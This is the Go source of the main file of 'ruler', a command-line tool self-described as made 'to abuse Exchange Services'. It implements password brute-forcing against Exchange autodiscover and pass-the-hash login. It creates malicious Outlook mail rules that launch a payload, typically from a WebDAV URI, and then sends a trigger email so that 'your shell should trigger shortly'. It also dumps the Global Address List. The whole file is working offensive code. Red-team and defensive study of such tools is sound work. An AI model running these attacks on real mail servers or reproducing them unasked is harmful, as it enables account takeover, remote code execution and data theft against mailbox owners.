package main

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"time"

	"github.com/howeyc/gopass"
	"github.com/sensepost/ruler/autodiscover"
	"github.com/sensepost/ruler/mapi"
	"github.com/sensepost/ruler/utils"
	"github.com/urfave/cli"
)

//globals
var config utils.Session

func exit(err error) {
	//we had an error and we don't have a MAPI session
	if err != nil {
		fmt.Println(err)
		os.Exit(-1)
	}
	//let's disconnect from the MAPI session
	exitcode, err := mapi.Disconnect()
	if err != nil {
		fmt.Println(err)
	}
	os.Exit(exitcode)
}

func getMapiHTTP(autoURLPtr string, resp *utils.AutodiscoverResp) (*utils.AutodiscoverResp, string) {
	//var resp *utils.AutodiscoverResp
	var err error
	var rawAutodiscover string

	if autoURLPtr == "" && resp == nil {
		fmt.Println("[*] Retrieving MAPI/HTTP info")
		//rather use the email address's domain here and --domain is the authentication domain
		lastBin := strings.LastIndex(config.Email, "@")
		if lastBin == -1 {
			exit(fmt.Errorf("[x] The supplied email address seems to be incorrect.\n%s", err))
		}
		maildomain := config.Email[lastBin+1:]
		resp, rawAutodiscover, err = autodiscover.MAPIDiscover(maildomain)
	} else if resp == nil {
		resp, rawAutodiscover, err = autodiscover.MAPIDiscover(autoURLPtr)
	}

	if resp == nil || err != nil {
		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
	}
	//check if the autodiscover service responded with an error
	if resp.Response.Error != (utils.AutoError{}) {
		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
	}
	return resp, rawAutodiscover
}

func getRPCHTTP(autoURLPtr string, resp *utils.AutodiscoverResp) (*utils.AutodiscoverResp, string) {
	//var resp *utils.AutodiscoverResp
	var err error
	var rawAutodiscover string

	if autoURLPtr == "" && resp == nil {
		fmt.Println("[*] Retrieving RPC/HTTP info")
		//rather use the email address's domain here and --domain is the authentication domain
		lastBin := strings.LastIndex(config.Email, "@")
		if lastBin == -1 {
			exit(fmt.Errorf("[x] The supplied email address seems to be incorrect.\n%s", err))
		}
		maildomain := config.Email[lastBin+1:]
		resp, rawAutodiscover, err = autodiscover.Autodiscover(maildomain)
	} else if resp == nil {
		resp, rawAutodiscover, err = autodiscover.Autodiscover(autoURLPtr)
	}

	if resp == nil || err != nil {
		exit(fmt.Errorf("[x] The autodiscover service request did not complete.\n%s", err))
	}
	//check if the autodiscover service responded with an error
	if resp.Response.Error != (utils.AutoError{}) {
		exit(fmt.Errorf("[x] The autodiscover service responded with an error.\n%s", resp.Response.Error.Message))
	}

	url := ""
	user := ""
	for _, v := range resp.Response.Account.Protocol {
		if v.Type == "EXPR" {
			if v.SSL == "Off" {
				url = "http://" + v.Server
			} else {
				url = "https://" + v.Server
			}
			if v.AuthPackage == "Ntlm" { //set the encryption on if the server specifies NTLM auth
				config.RPCEncrypt = true
			}
		}
		if v.Type == "EXCH" {
			user = v.Server
		}
	}
	config.RPCURL = fmt.Sprintf("%s/rpc/rpcproxy.dll?%s:6001", url, user)
	config.RPCMailbox = user
	fmt.Printf("[+] RPC URL set: %s\n", config.RPCURL)
	return resp, rawAutodiscover
}

func checkCache(email string) *utils.AutodiscoverResp {
	//check the cache folder for a stored autodiscover record
	email = strings.Replace(email, "@", "_", -1)
	email = strings.Replace(email, ".", "_", -1)
	path := fmt.Sprintf("./logs/%s.cache", email)

	if _, err := os.Stat(path); err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		fmt.Println("[x] Error ", err)
		return nil
	}
	fmt.Println("[*] Found cached Autodiscover record. Using this (use --nocache to force new lookup)")
	data, err := ioutil.ReadFile(path)
	if err != nil {
		fmt.Println("[x] Error reading stored record", err)
		return nil
	}
	autodiscoverResp := utils.AutodiscoverResp{}
	autodiscoverResp.Unmarshal(data)
	return &autodiscoverResp
}

func createCache(email, autodiscover string) {
	if autodiscover == "" { //no autodiscover record passed in, don't try write
		return
	}
	email = strings.Replace(email, "@", "_", -1)
	email = strings.Replace(email, ".", "_", -1)
	path := fmt.Sprintf("./logs/%s.cache", email)
	if _, err := os.Stat("./logs"); err != nil {
		if os.IsNotExist(err) {
			//create the logs directory
			if err := os.MkdirAll("./logs", 0711); err != nil {
				fmt.Println("[x] Couldn't create a cache directory")
			}
			//return nil
		}
	}
	fout, _ := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0666)
	_, err := fout.WriteString(autodiscover)
	if err != nil {
		fmt.Println("Couldn't write to file for some reason..", err)
	}
}

//function to perform a bruteforce
func brute(c *cli.Context) error {
	if c.String("users") == "" && c.String("userpass") == "" {
		return fmt.Errorf("Either --users or --userpass required")
	}
	if c.String("passwords") == "" && c.String("userpass") == "" {
		return fmt.Errorf("Either --passwords or --userpass required")

	}
	if c.GlobalString("domain") == "" && c.GlobalString("url") == "" {
		return fmt.Errorf("Either --domain or --url required")
	}

	fmt.Println("[*] Starting bruteforce")
	userpass := c.String("userpass")

	if userpass == "" {
		if c.GlobalString("domain") != "" {
			autodiscover.BruteForce(c.GlobalString("domain"), c.String("users"), c.String("passwords"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		} else {
			autodiscover.BruteForce(c.GlobalString("url"), c.String("users"), c.String("passwords"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		}
	} else {
		if c.GlobalString("domain") != "" {
			autodiscover.UserPassBruteForce(c.GlobalString("domain"), c.String("userpass"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		} else {
			autodiscover.UserPassBruteForce(c.GlobalString("url"), c.String("userpass"), c.GlobalBool("basic"), c.GlobalBool("insecure"), c.Bool("stop"), c.Bool("verbose"), c.Int("attempts"), c.Int("delay"))
		}
	}
	return nil
}

//Function to add new rule
func addRule(c *cli.Context) error {
	fmt.Println("[*] Adding Rule")

	res, err := mapi.ExecuteMailRuleAdd(c.String("name"), c.String("trigger"), c.String("location"), true)
	if res.StatusCode != 0 {
		return fmt.Errorf("[x] Failed to create rule. %s", err)
	}
	if err != nil {
		return err
	}
	fmt.Println("[*] Rule Added. Fetching list of rules...")
	rules, err := mapi.DisplayRules()
	if err != nil {
		return err
	}
	fmt.Printf("[+] Found %d rules\n", len(rules))
	for _, v := range rules {
		fmt.Printf("Rule Name: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
	}

	if c.Bool("send") {
		fmt.Println("[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
		//initate a ping sequence, just incase we are on RPC/HTTP
		//we need to keep the socket open
		go mapi.Ping()
		time.Sleep(time.Second * (time.Duration)(30))
		fmt.Println("[*] Sending email")
		sendMessage(c.String("trigger"))
	}

	return nil
}

//Function to delete a rule
func deleteRule(c *cli.Context) error {

	ruleid, err := hex.DecodeString(c.String("id"))
	if err != nil {
		return fmt.Errorf("[x] Incorrect ruleid format. ")
	}

	err = mapi.ExecuteMailRuleDelete(ruleid)
	if err == nil {
		fmt.Println("[*] Rule deleted. Fetching list of remaining rules...")
		rules, er := mapi.DisplayRules()
		if er != nil {
			return er
		}
		fmt.Printf("[+] Found %d rules\n", len(rules))
		for _, v := range rules {
			fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
		}
		return nil
	}
	return err
}

//Function to display all rules
func displayRules(c *cli.Context) error {
	fmt.Println("[+] Retrieving Rules")
	rules, er := mapi.DisplayRules()

	if er != nil {
		return er
	}

	fmt.Printf("[+] Found %d rules\n", len(rules))
	for _, v := range rules {
		fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
	}
	return er
}

func sendMessage(triggerword string) error {

	propertyTags := make([]mapi.PropertyTag, 1)
	propertyTags[0] = mapi.PidTagDisplayName

	_, er := mapi.GetFolder(mapi.OUTBOX, nil) //propertyTags)
	if er != nil {
		fmt.Println(er)
		return er
	}
	_, er = mapi.SendMessage(triggerword)
	if er != nil {
		return er
	}
	fmt.Println("[*] Message sent, your shell should trigger shortly.")

	return nil
}

//Function to connect to the Exchange server
func connect(c *cli.Context) error {
	var err error
	//check that name, trigger and location were supplied
	if c.GlobalString("email") == "" && c.GlobalString("username") == "" {
		return fmt.Errorf("Missing global argument. Use --domain (if needed), --username and --email")
	}
	//if no password or hash was supplied, read from stdin
	if c.GlobalString("password") == "" && c.GlobalString("hash") == "" {
		fmt.Printf("Password: ")
		var pass []byte
		pass, err = gopass.GetPasswd()
		if err != nil {
			// Handle gopass.ErrInterrupted or getch() read error
			return fmt.Errorf("[x] Password or hash required. Supply NTLM hash with --hash")
		}
		config.Pass = string(pass)
	} else {
		config.Pass = c.GlobalString("password")
		if config.NTHash, err = hex.DecodeString(c.GlobalString("hash")); err != nil {
			return fmt.Errorf("[x] Invalid hash provided. Hex decode failed")
		}

	}
	//setup our autodiscover service
	config.Domain = c.GlobalString("domain")
	config.User = c.GlobalString("username")

	config.Email = c.GlobalString("email")

	config.Basic = c.GlobalBool("basic")
	config.Insecure = c.GlobalBool("insecure")
	config.Verbose = c.GlobalBool("verbose")
	config.Admin = c.GlobalBool("admin")
	config.RPCEncrypt = c.GlobalBool("encrypt")

	url := c.GlobalString("url")

	if c.GlobalBool("o365") == true {
		url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
	}

	autodiscover.SessionConfig = &config

	var resp *utils.AutodiscoverResp
	var rawAutodiscover string

	//unless user specified nocache, check cache for existing autodiscover
	if c.GlobalBool("nocache") == false {
		resp = checkCache(config.Email)
	}

	//var err error
	//try connect to MAPI/HTTP first -- this is faster and the code-base is more stable
	//unless of course the global "RPC" flag has been set, which specifies we should just use
	//RPC/HTTP from the get-go
	if !c.GlobalBool("rpc") {
		var mapiURL, abkURL, userDN string

		resp, rawAutodiscover = getMapiHTTP(url, resp)
		mapiURL = mapi.ExtractMapiURL(resp)
		abkURL = mapi.ExtractMapiAddressBookURL(resp)
		userDN = resp.Response.User.LegacyDN

		if mapiURL == "" { //try RPC
			//fmt.Println("[x] No MAPI URL found. Trying RPC/HTTP")
			resp, rawAutodiscover = getRPCHTTP(url, resp)
			if resp.Response.User.LegacyDN == "" {
				return fmt.Errorf("[x] Both MAPI/HTTP and RPC/HTTP failed. Are the credentials valid? \n%s", resp.Response.Error)
			}
			mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
			createCache(config.Email, rawAutodiscover) //store the autodiscover for future use
		} else {
			fmt.Println("[+] MAPI URL found: ", mapiURL)
			fmt.Println("[+] MAPI AddressBook URL found: ", abkURL)
			mapi.Init(&config, userDN, mapiURL, abkURL, mapi.HTTP)
			createCache(config.Email, rawAutodiscover) //store the autodiscover for future use
		}

	} else {
		fmt.Println("[*] RPC/HTTP forced, trying RPC/HTTP")
		resp, rawAutodiscover = getRPCHTTP(url, resp)
		mapi.Init(&config, resp.Response.User.LegacyDN, "", "", mapi.RPC)
		createCache(config.Email, rawAutodiscover) //store the autodiscover for future use
	}

	//now we should do the login
	logon, err := mapi.Authenticate()

	if err != nil {
		exit(err)
	} else if logon.MailboxGUID != nil {
		if c.GlobalBool("verbose") {
			fmt.Println("[*] And we are authenticated")
			fmt.Println("[*] Openning the Inbox")
		}
		propertyTags := make([]mapi.PropertyTag, 2)
		propertyTags[0] = mapi.PidTagDisplayName
		propertyTags[1] = mapi.PidTagSubfolders
		mapi.GetFolder(mapi.INBOX, propertyTags) //Open Inbox
	}
	return nil
}

//Function to display all rules
func abkList(c *cli.Context) error {
	if config.Transport == mapi.RPC {
		return fmt.Errorf("[x] Address book support is currently limited to MAPI/HTTP")
	}
	fmt.Println("[*] Let's play addressbook")
	mapi.BindAddressBook()
	columns := make([]mapi.PropertyTag, 2)
	columns[0] = mapi.PidTagSMTPAddress
	columns[1] = mapi.PidTagDisplayName
	rows, _ := mapi.QueryRows(10, columns) //pull first 255 entries
	fmt.Println("[*] Found the following entries: ")
	for k := 0; k < int(rows.RowCount); k++ {
		for v := 0; v < int(rows.Columns.PropertyTagCount); v++ {
			//value, p = mapi.ReadPropertyValue(rows.RowData[k].ValueArray[p:], rows.Columns.PropertyTags[v].PropertyType)
			fmt.Printf("%s :: ", rows.RowData[k].AddressBookPropertyValue[v].Value)
		}
		fmt.Println("")
	}
	rows, _ = mapi.QueryRows(10, columns) //pull first 255 entries
	fmt.Println("[*] Found the following entries: ")
	for k := 0; k < int(rows.RowCount); k++ {
		for v := 0; v < int(rows.Columns.PropertyTagCount); v++ {
			//value, p = mapi.ReadPropertyValue(rows.RowData[k].ValueArray[p:], rows.Columns.PropertyTags[v].PropertyType)
			fmt.Printf("%s :: ", rows.RowData[k].AddressBookPropertyValue[v].Value)
		}
		fmt.Println("")
	}
	return nil
}

func main() {
	app := cli.NewApp()
	app.Name = "ruler"
	app.Usage = "A tool to abuse Exchange Services"
	app.Version = "2.0"
	app.Author = "Etienne Stalmans <etienne@sensepost.com>"
	app.Description = `         _
 _ __ _   _| | ___ _ __
| '__| | | | |/ _ \ '__|
| |  | |_| | |  __/ |
|_|   \__,_|_|\___|_|

A tool by @sensepost to abuse Exchange Services.`

	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:  "domain,d",
			Value: "",
			Usage: "A domain for the user (usually required for domain\\username)",
		},
		cli.BoolFlag{
			Name:  "o365",
			Usage: "We know the target is on office365, so authenticate directly against that.",
		},
		cli.StringFlag{
			Name:  "username,u",
			Value: "",
			Usage: "A valid username",
		},
		cli.StringFlag{
			Name:  "password,p",
			Value: "",
			Usage: "A valid password",
		},
		cli.StringFlag{
			Name:  "hash",
			Value: "",
			Usage: "A NT hash for pass the hash (NTLMv1)",
		},
		cli.StringFlag{
			Name:  "email,e",
			Value: "",
			Usage: "The target's email address",
		},
		cli.StringFlag{
			Name:  "url",
			Value: "",
			Usage: "If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml",
		},
		cli.BoolFlag{
			Name:  "insecure,k",
			Usage: "Ignore server SSL certificate errors",
		},
		cli.BoolFlag{
			Name:  "encrypt",
			Usage: "Use NTLM auth on the RPC level - some environments require this",
		},
		cli.BoolFlag{
			Name:  "basic,b",
			Usage: "Force Basic authentication",
		},
		cli.BoolFlag{
			Name:  "admin",
			Usage: "Login as an admin",
		},
		cli.BoolFlag{
			Name:  "nocache",
			Usage: "Don't use the cached autodiscover record",
		},
		cli.BoolFlag{
			Name:  "rpc",
			Usage: "Force RPC/HTTP rather than MAPI/HTTP",
		},
		cli.BoolFlag{
			Name:  "verbose",
			Usage: "Be verbose and show some of thei inner workings",
		},
	}

	app.Commands = []cli.Command{
		{
			Name:    "add",
			Aliases: []string{"a"},
			Usage:   "add a new rule",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "name,n",
					Value: "Delete Spam",
					Usage: "A name for our rule",
				},
				cli.StringFlag{
					Name:  "trigger,t",
					Value: "Hey John",
					Usage: "A trigger word or phrase - this is going to be the subject of our trigger email",
				},
				cli.StringFlag{
					Name:  "location,l",
					Value: "C:\\Windows\\System32\\calc.exe",
					Usage: "The location of our application to launch. Typically a WEBDAV URI",
				},
				cli.BoolFlag{
					Name:  "send,s",
					Usage: "Trigger the rule by sending an email to the target",
				},
			},
			Action: func(c *cli.Context) error {
				//check that name, trigger and location were supplied
				if c.String("name") == "" || c.String("trigger") == "" || c.String("location") == "" {
					cli.NewExitError("Missing rule item. Use --name, --trigger and --location", 1)
				}

				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				err = addRule(c)
				exit(err)
				return nil
			},
		},
		{
			Name:    "delete",
			Aliases: []string{"r"},
			Usage:   "delete an existing rule",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "id",
					Value: "",
					Usage: "The ID of the rule to delete",
				},
			},
			Action: func(c *cli.Context) error {
				//check that ID was supplied
				if c.String("id") == "" {
					return cli.NewExitError("Rule id required. Use --id", 1)
				}
				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				err = deleteRule(c)
				exit(err)
				return nil
			},
		},
		{
			Name:    "display",
			Aliases: []string{"d"},
			Usage:   "display all existing rules",
			Action: func(c *cli.Context) error {
				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				err = displayRules(c)
				exit(err)
				return nil
			},
		},
		{
			Name:    "check",
			Aliases: []string{"c"},
			Usage:   "Check if the credentials work and we can interact with the mailbox",
			Action: func(c *cli.Context) error {
				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				fmt.Println("[*] Looks like we are good to go!")
				return nil
			},
		},
		{
			Name:    "send",
			Aliases: []string{"s"},
			Usage:   "Send an email to trigger an existing rule. This uses the target user's own account.",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "trigger,t",
					Value: "",
					Usage: "A trigger word or phrase to use",
				},
			},
			Action: func(c *cli.Context) error {
				//check that trigger word was supplied
				if c.String("trigger") == "" {
					return cli.NewExitError("The trigger word/phrase is required. Use --trigger", 1)
				}
				err := connect(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				sendMessage(c.String("trigger"))
				return nil
			},
		},
		{
			Name:    "brute",
			Aliases: []string{"b"},
			Usage:   "Do a bruteforce attack against the autodiscover service to find valid username/passwords",
			Flags: []cli.Flag{
				cli.StringFlag{
					Name:  "users,u",
					Value: "",
					Usage: "Filename for a username list (one name per line)",
				},
				cli.StringFlag{
					Name:  "passwords,p",
					Value: "",
					Usage: "Filename for a password list (one password per line)",
				},
				cli.StringFlag{
					Name:  "userpass",
					Value: "",
					Usage: "Filename for a username:password list (one per line)",
				},
				cli.IntFlag{
					Name:  "attempts,a",
					Value: 3,
					Usage: "Number of attempts before delay",
				},
				cli.IntFlag{
					Name:  "delay,d",
					Value: 5,
					Usage: "Number of seconds to delay between attempts",
				},
				cli.BoolFlag{
					Name:  "stop,s",
					Usage: "Stop on success",
				},
				cli.BoolFlag{
					Name:  "verbose,v",
					Usage: "Display each attempt",
				},
			},
			Action: func(c *cli.Context) error {
				err := brute(c)
				if err != nil {
					return cli.NewExitError(err, 1)
				}
				return nil
			},
		},
		{
			Name:  "abk",
			Usage: "Interact with the Global Address Book",
			Subcommands: []cli.Command{
				{
					Name:  "list",
					Usage: "list the entries of the GAL",
					Action: func(c *cli.Context) error {
						err := connect(c)
						if err != nil {
							return cli.NewExitError(err, 1)
						}
						err = abkList(c)
						if err != nil {
							return cli.NewExitError(err, 1)
						}
						return nil
					},
				},
			},
		},
	}

	app.Action = func(c *cli.Context) error {
		cli.ShowAppHelp(c)
		return nil
	}

	app.Run(os.Args)

}
